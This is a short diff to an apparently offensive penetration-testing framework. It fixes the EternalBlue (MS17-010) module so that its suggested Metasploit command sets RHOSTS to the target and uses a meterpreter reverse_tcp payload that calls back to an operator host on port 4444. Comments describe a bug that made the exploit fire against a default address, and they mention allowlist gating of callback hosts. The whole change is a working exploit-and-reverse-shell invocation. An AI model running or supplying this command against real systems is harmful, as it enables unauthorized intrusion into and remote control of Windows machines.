@@ -33,7 +33,16 @@ class EternalBlue(AttackModule):
             "status": "info",
             "module": self.name,
             "note": "Requires msfconsole module exploit/windows/smb/ms17_010_eternalblue",
-            "suggested_msf": f"exploit/windows/smb/ms17_010_eternalblue target={ctx.target_ip}",
+            # Phase 2: run_msf_module parses key=value pairs and runs
+            # `set <key> <val>` in msfconsole -- the real MSF option is RHOSTS,
+            # not `target` (which was silently ignored, so the exploit fired
+            # against the default 192.168.1.1). LHOST must be an
+            # allowlist-authorized callback host (msf_generate_payload /
+            # msf_start_handler already gate it).
+            "suggested_msf": (
+                f"exploit/windows/smb/ms17_010_eternalblue RHOSTS={ctx.target_ip} "
+                f"PAYLOAD=windows/x64/meterpreter/reverse_tcp LHOST=<op_callback> LPORT=4444"
+            ),
         }
 
 class SMBRelay(AttackModule):
